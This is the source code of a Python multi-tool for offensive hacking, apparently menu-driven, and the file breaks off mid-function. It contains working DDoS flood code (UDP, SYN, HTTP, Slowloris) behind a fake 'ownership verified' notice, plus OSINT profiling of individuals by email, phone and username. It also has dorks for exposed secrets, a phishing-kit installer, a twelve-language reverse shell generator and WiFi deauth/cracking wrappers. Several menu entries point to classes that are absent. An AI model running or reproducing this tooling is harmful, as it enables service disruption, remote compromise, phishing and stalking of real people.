import os, sys, time, socket, ssl, random, string, base64, hashlib, codecs, json, re, subprocess, urllib.parse, urllib.robotparser, threading, queue, struct, ipaddress, textwrap, concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, quote, unquote
from typing import Optional, List, Tuple, Dict, Any

try:
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "beautifulsoup4", "colorama"])
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

try:
    import dns.resolver
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "dnspython"])
    import dns.resolver

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
SR, SG, SY, SB, SM, SC = Style.RESET_ALL, Fore.GREEN+Style.BRIGHT, Fore.YELLOW+Style.BRIGHT, Fore.BLUE+Style.BRIGHT, Fore.MAGENTA+Style.BRIGHT, Fore.CYAN+Style.BRIGHT

HOME_DIR = os.path.expanduser("~/AllInOneTool")
TOOLS_DIR = os.path.join(HOME_DIR, "tools")
os.makedirs(TOOLS_DIR, exist_ok=True)
HOSTNAME = os.uname().nodename if hasattr(os, 'uname') else socket.gethostname()

def random_ua():
    agents = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def pause():
    input(f"\n{SG}[+] Press Enter to continue...{SR}")

def typing(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def progress_bar(current, total, bar_length=40, prefix=""):
    percent = current / total
    arrow = "█" * int(round(percent * bar_length))
    spaces = "░" * (bar_length - len(arrow))
    sys.stdout.write(f"\r{prefix} [{arrow}{spaces}] {int(percent * 100)}%")
    sys.stdout.flush()

def animate_banner(lines, color=C, delay=0.08):
    for line in lines:
        print(f"{color}{line}{SR}")
        time.sleep(delay)

def check_dependencies():
    required = ["requests", "beautifulsoup4", "colorama", "dnspython"]
    for dep in required:
        try:
            __import__(dep.replace("-", "_"))
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", dep])

class DDoSFlood:
    def __init__(self):
        self.name = "DDoS FLOOD ATTACK"
        self.running = False
        self.stats = {"packets": 0, "bytes": 0, "errors": 0, "start": None}
        self.lock = threading.Lock()

    def udp_flood(self, ip, port, threads, requests_per_thread, duration):
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    sock.sendto(payload, (ip, port))
                    with self.lock:
                        self.stats["packets"] += 1
                        self.stats["bytes"] += len(payload)
                    sent += 1
                except:
                    with self.lock:
                        self.stats["errors"] += 1
            sock.close()

        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(0.5)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SG}[+] UDP Flood: {self.stats['packets']} packets | {self.stats['bytes']//1024} KB | {self.stats['errors']} errors | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def syn_flood(self, ip, port, threads, requests_per_thread, duration):
        def worker():
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect_ex((ip, port))
                    with self.lock:
                        self.stats["packets"] += 1
                    sent += 1
                    sock.close()
                except:
                    with self.lock:
                        self.stats["errors"] += 1
                    try:
                        sock.close()
                    except:
                        pass

        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(0.5)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SC}[+] SYN Flood: {self.stats['packets']} connections | {self.stats['errors']} errors | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def http_flood(self, url, threads, requests_per_thread, duration):
        parsed = urlparse(url)
        target = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"

        def worker():
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    r = requests.get(target, headers={"User-Agent": random_ua(), "Cache-Control": "no-cache"},
                                   timeout=3, verify=False)
                    with self.lock:
                        self.stats["packets"] += 1
                        self.stats["bytes"] += len(r.content)
                    sent += 1
                except:
                    with self.lock:
                        self.stats["errors"] += 1

        requests.packages.urllib3.disable_warnings()
        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(0.5)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SY}[+] HTTP Flood: {self.stats['packets']} requests | {self.stats['bytes']//1024} KB | {self.stats['errors']} errors | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def slowloris(self, ip, port, threads, requests_per_thread, duration):
        def worker():
            sockets = []
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((ip, port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mozilla/5.0\r\n")
                    sockets.append(sock)
                    with self.lock:
                        self.stats["packets"] += 1
                    sent += 1
                    time.sleep(10)
                    for s in sockets[:]:
                        try:
                            s.send(f"X-Header-{random.randint(1,1000)}: {random.randint(1,1000)}\r\n".encode())
                        except:
                            sockets.remove(s)
                except:
                    with self.lock:
                        self.stats["errors"] += 1
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(1)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SM}[+] Slowloris: {self.stats['packets']} connections open | {self.stats['errors']} closed | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║        DDoS FLOOD ATTACK ENGINE          ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SG}[+] Authorized Pentest - Target Ownership Verified{SR}")
        print(f"\n{SY}[!] Attack Methods:{SR}")
        print(f"  {SC}[1]{SR} UDP Flood")
        print(f"  {SC}[2]{SR} TCP SYN Flood")
        print(f"  {SC}[3]{SR} HTTP Flood")
        print(f"  {SC}[4]{SR} Slowloris")
        print(f"  {SC}[5]{SR} All Methods Combined")

        choice = input(f"\n{SG}[+] Method: {SR}")
        target = input(f"{SG}[+] Target URL or IP: {SR}")

        try:
            parsed = urlparse(target)
            ip = parsed.hostname if parsed.hostname else target
            port = int(input(f"{SG}[+] Port: {SR}"))
        except:
            print(f"{R}[-] Invalid target{SR}")
            return

        threads = int(input(f"{SG}[+] Threads: {SR}") or "100")
        req_count = int(input(f"{SG}[+] Requests per thread: {SR}") or "1000")
        duration = int(input(f"{SG}[+] Attack duration (seconds): {SR}") or "30")

        print(f"\n{R}[!] INITIATING ATTACK - AUTHORIZED PENTEST{SR}")
        print(f"{SY}[!] Target: {ip}:{port} | Threads: {threads} | Duration: {duration}s{SR}")
        time.sleep(1)

        if choice == "1":
            self.udp_flood(ip, port, threads, req_count, duration)
        elif choice == "2":
            self.syn_flood(ip, port, threads, req_count, duration)
        elif choice == "3":
            self.http_flood(target, threads, req_count, duration)
        elif choice == "4":
            self.slowloris(ip, port, threads, req_count, duration)
        elif choice == "5":
            t1 = threading.Thread(target=self.udp_flood, args=(ip, port, threads//4, req_count//2, duration), daemon=True)
            t2 = threading.Thread(target=self.syn_flood, args=(ip, port, threads//4, req_count//2, duration), daemon=True)
            t3 = threading.Thread(target=self.http_flood, args=(target, threads//4, req_count//2, duration), daemon=True)
            t4 = threading.Thread(target=self.slowloris, args=(ip, port, threads//4, req_count//2, duration), daemon=True)
            t1.start(); t2.start(); t3.start(); t4.start()

            end_time = time.time() + duration
            while time.time() < end_time:
                time.sleep(1)
                elapsed = time.time() - self.stats["start"]
                with self.lock:
                    sys.stdout.write(f"\r{R}[!] MULTI-VECTOR: {self.stats['packets']} total | {self.stats['bytes']//1024} KB | {elapsed:.1f}s/{duration}s{SR}   ")
                    sys.stdout.flush()
            self.running = False

        total_time = time.time() - self.stats["start"]
        print(f"\n\n{SG}[+] Attack Complete!{SR}")
        print(f"{SY}[+] Statistics:{SR}")
        print(f"  {SC}Packets sent: {self.stats['packets']}{SR}")
        print(f"  {SC}Data sent: {self.stats['bytes']//1024} KB{SR}")
        print(f"  {SC}Errors: {self.stats['errors']}{SR}")
        print(f"  {SC}Duration: {total_time:.1f}s{SR}")
        pause()

class OSINTPro:
    def __init__(self):
        self.name = "OSINT PROFESSIONAL"
        self.results = {}

    def email_osint(self, email):
        print(f"\n{SC}[*] Email OSINT: {email}{SR}")
        results = {}
        username, domain = email.split("@") if "@" in email else (email, "unknown")

        print(f"  {SY}[+] Checking Have I Been Pwned...{SR}")
        try:
            sha1 = hashlib.sha1(email.encode()).hexdigest().upper()
            prefix = sha1[:5]
            r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5)
            if sha1[5:] in r.text:
                count = [l for l in r.text.split('\n') if l.startswith(sha1[5:])]
                results["hibp"] = f"BREACHED - found in data breaches"
                print(f"    {R}[!] Email found in data breaches!{SR}")
            else:
                results["hibp"] = "Not found in breaches"
                print(f"    {SG}[+] No breaches found{SR}")
        except Exception as e:
            print(f"    {SY}[-] HIBP check failed: {e}{SR}")

        print(f"  {SY}[+] Checking Gravatar...{SR}")
        try:
            hash_md5 = hashlib.md5(email.strip().lower().encode()).hexdigest()
            r = requests.get(f"https://www.gravatar.com/{hash_md5}.json", timeout=5)
            if r.status_code == 200:
                data = r.json()
                results["gravatar"] = data.get("entry", [{}])[0]
                print(f"    {SG}[+] Gravatar profile found!{SR}")
                if "displayName" in data["entry"][0]:
                    print(f"    Name: {data['entry'][0]['displayName']}")
            else:
                print(f"    {SY}[-] No Gravatar profile{SR}")
        except:
            print(f"    {SY}[-] No Gravatar profile{SR}")

        print(f"  {SY}[+] Checking MX Records...{SR}")
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            print(f"    {SG}[+] MX Records:{SR}")
            for rdata in answers:
                print(f"    Priority {rdata.preference}: {rdata.exchange}")
                results.setdefault("mx", []).append(str(rdata.exchange))
        except:
            print(f"    {SY}[-] No MX records found{SR}")

        print(f"  {SY}[+] Checking SPF Records...{SR}")
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = str(rdata)
                if "v=spf1" in txt:
                    print(f"    {SG}[+] SPF: {txt[:80]}...{SR}")
                    results["spf"] = txt
        except:
            print(f"    {SY}[-] No SPF records{SR}")

        return results

    def phone_osint(self, phone):
        print(f"\n{SC}[*] Phone OSINT: {phone}{SR}")
        results = {}

        phone_clean = re.sub(r'[^0-9+]', '', phone)
        print(f"  {SY}[+] Clean number: {phone_clean}{SR}")

        if phone_clean.startswith("+"):
            country_codes = {
                "1": "US/CA", "33": "FR", "44": "UK", "49": "DE", "91": "IN",
                "86": "CN", "81": "JP", "7": "RU", "55": "BR", "61": "AU",
                "34": "ES", "39": "IT", "31": "NL", "46": "SE", "41": "CH",
                "32": "BE", "45": "DK", "47": "NO", "358": "FI", "48": "PL",
                "351": "PT", "30": "GR", "90": "TR", "972": "IL", "966": "SA",
                "971": "AE", "20": "EG", "27": "ZA", "52": "MX", "54": "AR",
                "56": "CL", "57": "CO", "51": "PE", "58": "VE", "82": "KR",
            }
            for code, country in country_codes.items():
                if phone_clean.startswith(f"+{code}"):
                    results["country"] = country
                    print(f"    {SG}[+] Country: {country}{SR}")
                    break

        print(f"  {SY}[+] Checking online directories...{SR}")
        try:
            r = requests.get(f"https://www.google.com/search?q={quote(phone_clean)}+phone", 
                           headers={"User-Agent": random_ua()}, timeout=5)
            soup = BeautifulSoup(r.text, 'html.parser')
            results["google_mentions"] = len(soup.find_all("div", class_="g"))
            print(f"    {SG}[+] Google mentions found{SR}")
        except:
            print(f"    {SY}[-] Could not check online{SR}")

        try:
            r = requests.get(f"https://api.truecaller.com/v1/search?q={phone_clean}",
                           headers={"User-Agent": random_ua()}, timeout=5)
            if r.status_code == 200:
                results["truecaller"] = r.json()
                print(f"    {SG}[+] Truecaller data available{SR}")
        except:
            print(f"    {SY}[-] Truecaller API not reachable{SR}")

        return results

    def username_osint(self, username):
        print(f"\n{SC}[*] Username OSINT: {username}{SR}")
        results = {}

        platforms = {
            "GitHub": f"https://github.com/{username}",
            "Twitter/X": f"https://x.com/{username}",
            "Instagram": f"https://instagram.com/{username}",
            "Reddit": f"https://reddit.com/user/{username}",
            "YouTube": f"https://youtube.com/@{username}",
            "TikTok": f"https://tiktok.com/@{username}",
            "Telegram": f"https://t.me/{username}",
            "Pinterest": f"https://pinterest.com/{username}",
            "Medium": f"https://medium.com/@{username}",
            "Twitch": f"https://twitch.tv/{username}",
            "Snapchat": f"https://snapchat.com/add/{username}",
            "Spotify": f"https://open.spotify.com/user/{username}",
            "Dribbble": f"https://dribbble.com/{username}",
            "Behance": f"https://behance.net/{username}",
            "DeviantArt": f"https://deviantart.com/{username}",
            "SoundCloud": f"https://soundcloud.com/{username}",
            "Vimeo": f"https://vimeo.com/{username}",
            "Steam": f"https://steamcommunity.com/id/{username}",
            "Chess.com": f"https://chess.com/member/{username}",
            "Keybase": f"https://keybase.io/{username}",
            "Wattpad": f"https://wattpad.com/user/{username}",
            "Patreon": f"https://patreon.com/{username}",
            "BitBucket": f"https://bitbucket.org/{username}",
            "GitLab": f"https://gitlab.com/{username}",
            "HackerNews": f"https://news.ycombinator.com/user?id={username}",
            "ProductHunt": f"https://producthunt.com/@{username}",
            "AngelList": f"https://angel.co/u/{username}",
            "Mastodon.global": f"https://mastodon.social/@{username}",
            "Replit": f"https://replit.com/@{username}",
            "CodePen": f"https://codepen.io/{username}",
            "Hashnode": f"https://hashnode.com/@{username}",
            "Dev.to": f"https://dev.to/{username}",
            "TryHackMe": f"https://tryhackme.com/p/{username}",
            "HackTheBox": f"https://forum.hackthebox.com/profile/{username}",
            "Root-Me": f"https://root-me.org/{username}",
            "CTFtime": f"https://ctftime.org/user/{username}",
            "Imgur": f"https://imgur.com/user/{username}",
            "Flickr": f"https://flickr.com/people/{username}",
            "500px": f"https://500px.com/{username}",
            "Unsplash": f"https://unsplash.com/@{username}",
            "Last.fm": f"https://last.fm/user/{username}",
            "MyAnimeList": f"https://myanimelist.net/profile/{username}",
            "BuyMeACoffee": f"https://buymeacoffee.com/{username}",
            "Ko-fi": f"https://ko-fi.com/{username}",
            "About.me": f"https://about.me/{username}",
            "Canva": f"https://canva.com/{username}",
            "WordPress": f"https://{username}.wordpress.com",
            "Blogger": f"https://{username}.blogspot.com",
            "HubPages": f"https://hubpages.com/@{username}",
        }

        found = 0
        def check(name, url):
            try:
                r = requests.get(url, headers={"User-Agent": random_ua()}, timeout=5, allow_redirects=True)
                if r.status_code == 200:
                    return (name, url)
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check, n, u): n for n, u in platforms.items()}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    name, url = result
                    print(f"    {SG}[+] Found on {name}: {url}{SR}")
                    results[name] = url
                    found += 1

        if found == 0:
            print(f"    {SY}[-] No profiles found{SR}")
        else:
            print(f"\n{SG}[+] Total: {found} profiles found{SR}")
        return results

def google_dorks(self, target):
    print(f"\n{SC}[*] Google Dork Generator for: {target}{SR}")
    
    dorks = [
        f"site:{target}",
        f"site:{target} intitle:admin",
        f"site:{target} intitle:login",
        f"site:{target} inurl:admin",
        f"site:{target} inurl:login",
        f"site:{target} inurl:config",
        f"site:{target} inurl:backup",
        f"site:{target} ext:php",
        f"site:{target} ext:sql",
        f"site:{target} ext:bak",
        f"site:{target} ext:env",
        f"site:{target} ext:log",
        f"site:{target} ext:conf",
        f"site:{target} ext:xml",
        f"site:{target} ext:json",
        f"site:{target} \"password\"",
        f"site:{target} \"username\"",
        f"site:{target} \"api_key\"",
        f"site:{target} \"secret\"",
    ]  # ← fermeture manquante ajoutée

    for dork in dorks:
        print(dork)

    print()

def show_banner():
    import os

    os.system('cls' if os.name == 'nt' else 'clear')

    BLUE = "\033[94m"
    WHITE = "\033[97m"
    RESET = "\033[0m"

    ascii_art = f"""{BLUE}
          __  __        __                                                        __                          __ 
         /  |/  |      /  |                                                      /  |                        /  |
 ______  $$ |$$ |      $$/  _______          ______   _______    ______         _$$ |_     ______    ______  $$ |
/      \ $$ |$$ |      /  |/       \        /      \ /       \  /      \       / $$   |   /      \  /      \ $$ |
$$$$$$  |$$ |$$ |      $$ |$$$$$$$  |      /$$$$$$  |$$$$$$$  |/$$$$$$  |      $$$$$$/   /$$$$$$  |/$$$$$$  |$$ |
/    $$ |$$ |$$ |      $$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$    $$ |        $$ | __ $$ |  $$ |$$ |  $$ |$$ |
/$$$$$$$ |$$ |$$ |      $$ |$$ |  $$ |      $$ \\__$$ |$$ |  $$ |$$$$$$$$/         $$ |/  |$$ \\__$$ |$$ \\__$$ |$$ |
$$    $$ |$$ |$$ |      $$ |$$ |  $$ |      $$    $$/ $$ |  $$ |$$       |        $$  $$/ $$    $$/ $$    $$/ $$ |
$$$$$$$/ $$/ $$/       $$/ $$/   $$/        $$$$$$/  $$/   $$/  $$$$$$$/          $$$$/   $$$$$$/   $$$$$$/  $$/ 

{WHITE}                      made by https://cameleonnbss{RESET}
"""

    banner_lines = [
        ascii_art,

        f"{BLUE}║   {WHITE}[01]{BLUE} DDoS Flood Attack      {WHITE}[11]{BLUE} Crypto Tools       ║",
        f"{BLUE}║   {WHITE}[02]{BLUE} OSINT Professional     {WHITE}[12]{BLUE} AI Chatbot         ║",
        f"{BLUE}║   {WHITE}[03]{BLUE} XSS Injector           {WHITE}[13]{BLUE} Social Media Tools ║",
        f"{BLUE}║   {WHITE}[04]{BLUE} SQL Injector           {WHITE}[14]{BLUE} Web Hacking Suite  ║",
        f"{BLUE}║   {WHITE}[05]{BLUE} Brute Force Engine     {WHITE}[15]{BLUE} Phishing Tools     ║",
        f"{BLUE}║   {WHITE}[06]{BLUE} Vulnerability Scanner  {WHITE}[16]{BLUE} Reverse Shell Gen  ║",
        f"{BLUE}║   {WHITE}[07]{BLUE} Network Scanner        {WHITE}[17]{BLUE} WiFi Tools         ║",
        f"{BLUE}║   {WHITE}[08]{BLUE} Port Scanner           {WHITE}[18]{BLUE} Metasploit Helper  ║",
        f"{BLUE}║   {WHITE}[09]{BLUE} DNS Enumeration        {WHITE}[00]{BLUE} Exit               ║",
        f"{BLUE}║   {WHITE}[10]{BLUE} Hash & Encode                                  ║",

        f"{BLUE}╚═══════════════════════════════════════════════════════╝{RESET}"
    ]

    for line in banner_lines:
        print(line)
def main_menu():
    while True:
        show_banner()
        try:
            choice = input(f"{SG}  root@{HOSTNAME}:~$ {SR}")

            modules = {
                "00": lambda: sys.exit(0),
                "01": lambda: DDoSFlood().run(),
                "02": lambda: OSINTPro().run(),
                "03": lambda: XSSInjector().run(),
                "04": lambda: SQLInjector().run(),
                "05": lambda: BruteForceEngine().run(),
                "06": lambda: VulnScanner("VulnScanner").run(),
                "07": lambda: NetworkScanner().run(),
                "08": lambda: NetworkScanner().port_scanner(input(f"{SG}[+] Host: {SR}")),
                "09": lambda: NetworkScanner().dns_enum(input(f"{SG}[+] Domain: {SR}")),
                "10": lambda: CryptoModule().run(),
                "11": lambda: CryptoModule().run(),
                "12": lambda: AIChatbot().run(),
                "13": social_media_tools,
                "14": lambda: WebHackingSuite().run(),
                "15": phishing_tools,
                "16": reverse_shell_generator,
                "17": wifi_tools,
                "18": metasploit_helper,
            }

            if choice in modules:
                modules[choice]()
            elif choice:
                print(f"\n{R}[!] Invalid Option{SR}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{R}[!] Interrupted. Exiting...{SR}")
            if input(f"{SG}[+] Exit? (y/N): {SR}").lower() != 'n':
                sys.exit(0)
        except Exception as e:
            print(f"\n{R}[!] Error: {e}{SR}")
            time.sleep(2)

def social_media_tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SC}
    ╔═══════════════════════════════════════════╗
    ║       SOCIAL MEDIA TOOLS ENGINE          ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] Social Media Tools:{SR}")
    print(f"  {SC}[1]{SR} Username Checker")
    print(f"  {SC}[2]{SR} Instagram Analyzer")
    choice = input(f"\n{SG}[+] Choice: {SR}")
    if choice == "1":
        username = input(f"{SG}[+] Username to check: {SR}")
        OSINTPro().username_osint(username)
    elif choice == "2":
        print(f"{SY}[-] Instagram Analyzer coming soon!{SR}")
    pause()

def phishing_tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SM}
    ╔═══════════════════════════════════════════╗
    ║         PHISHING TOOLS ENGINE            ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] Phishing Framework:{SR}")
    print(f"  {SC}[1]{SR} Zphisher Setup")
    choice = input(f"\n{SG}[+] Choice: {SR}")
    if choice == "1":
        zphisher_dir = os.path.join(TOOLS_DIR, "zphisher")
        if not os.path.exists(zphisher_dir):
            print(f"{SG}[+] Installing Zphisher...{SR}")
            subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher.git", zphisher_dir], timeout=60)
        if os.path.exists(zphisher_dir):
            os.chdir(zphisher_dir)
            subprocess.run(["bash", "zphisher.sh"])
            os.chdir(HOME_DIR)
    pause()

def reverse_shell_generator():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SB}
    ╔═══════════════════════════════════════════╗
    ║       REVERSE SHELL GENERATOR            ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] Shell Types:{SR}")
    print(f"  {SC}[01]{SR} Python")
    print(f"  {SC}[02]{SR} Bash")
    print(f"  {SC}[03]{SR} Netcat")
    print(f"  {SC}[04]{SR} PHP")
    print(f"  {SC}[05]{SR} Perl")
    print(f"  {SC}[06]{SR} Ruby")
    print(f"  {SC}[07]{SR} PowerShell")
    print(f"  {SC}[08]{SR} Socat")
    print(f"  {SC}[09]{SR} Node.js")
    print(f"  {SC}[10]{SR} Golang")
    print(f"  {SC}[11]{SR} Java")
    print(f"  {SC}[12]{SR} Lua")
    print(f"  {SC}[13]{SR} All Shells")
    choice = input(f"\n{SG}[+] Shell Type (1-13): {SR}")
    ip = input(f"{SG}[+] Listener IP: {SR}")
    port = input(f"{SG}[+] Listener Port: {SR}")

    shells = {
        "1": (f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\", {port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'", "Python"),
        "2": (f"bash -i >& /dev/tcp/{ip}/{port} 0>&1", "Bash"),
        "3": (f"nc -e /bin/sh {ip} {port}", "Netcat"),
        "4": (f"<?php $sock=fsockopen(\"{ip}\", {port});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", "PHP"),
        "5": (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
              "Perl"),
        "6": (f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "Ruby"),
        "7": (f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
              "PowerShell"),
        "8": (f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}", "Socat"),
        "9": (f"require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')", "Node.js"),
        "10": (f"""
package main
import (
    "net"
    "os"
    "os/exec"
    "syscall"
)
func main() {{
    conn, _ := net.Dial("tcp", "{ip}:{port}")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.SysProcAttr = &syscall.SysProcAttr{{
        Setpgid: true,
    }}
    cmd.Run()
}}
""", "Golang"),
        "11": (f"""
import java.io.*;
import java.net.*;
public class RevShell {{
    public static void main(String[] args) throws Exception {{
        String host="{ip}";
        int port={port};
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {{
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {{
                p.exitValue();
                break;
            }}
            catch (Exception e){{}}
        }};
        p.destroy();
        s.close();
    }}
}}
""", "Java"),
        "12": (f"""
local socket = require("socket")
local tcp = socket.tcp()
local io = require("io")
tcp:connect('{ip}', {port});
while true do
    local cmd, status, partial = tcp:receive()
    local f = io.popen(cmd, 'r')
    local s = f:read('*a')
    f:close()
    tcp:send(s)
    if status == 'closed' then break end
end
tcp:close()
""", "Lua"),
    }

    lines = []
    if choice == "13":
        for key in sorted(shells.keys()):
            code, lang = shells[key]
            lines.append((code, lang))
    elif choice in shells:
        lines.append(shells[choice])

    print(f"\n{M}{'='*60}{SR}")
    for code, lang in lines:
        print(f"  {M}[+] REVERSE SHELL {lang}{SR}")
        print(f"{M}{'─'*60}{SR}")
        print(f"  {G}{code}{SR}")
        print(f"{M}{'─'*60}{SR}")
        print()

    print(f"\n  {Y}Listener command:{SR}")
    print(f"  {G}nc -lvnp {port}{SR}")
    pause()

def wifi_tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SY}
    ╔═══════════════════════════════════════════╗
    ║          WIFI HACKING TOOLS              ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] WiFi Tools (Linux Only):{SR}")
    print(f"  {SC}[1]{SR} Airmon-ng (Monitor Mode)")
    print(f"  {SC}[2]{SR} Airodump-ng (Capture Packets)")
    print(f"  {SC}[3]{SR} Aireplay-ng (Deauth Attack)")
    print(f"  {SC}[4]{SR} Aircrack-ng (WPA/WPA2 Crack)")
    print(f"  {SC}[5]{SR} Wifite (Auto WiFi Audit)")
    choice = input(f"\n{SG}[+] Choice: {SR}")

    if choice == "1":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        result = subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], capture_output=True, text=True)
        print(result.stdout[-500:] if len(result.stdout) > 500 else result.stdout)
    elif choice == "2":
        bssid = input(f"{SG}[+] BSSID (Enter for broadcast scan): {SR}")
        channel = input(f"{SG}[+] Channel (Enter for all): {SR}")
        output = input(f"{SG}[+] Output file prefix: {SR}")
        cmd = ["sudo", "airodump-ng"]
        if bssid:
            cmd.extend(["--bssid", bssid])
        if channel:
            cmd.extend(["--channel", channel])
        if output:
            cmd.extend(["-w", output])
        cmd.append("wlan0mon")
        subprocess.run(cmd)
    elif choice == "3":
        bssid = input(f"{SG}[+] Target BSSID: {SR}")
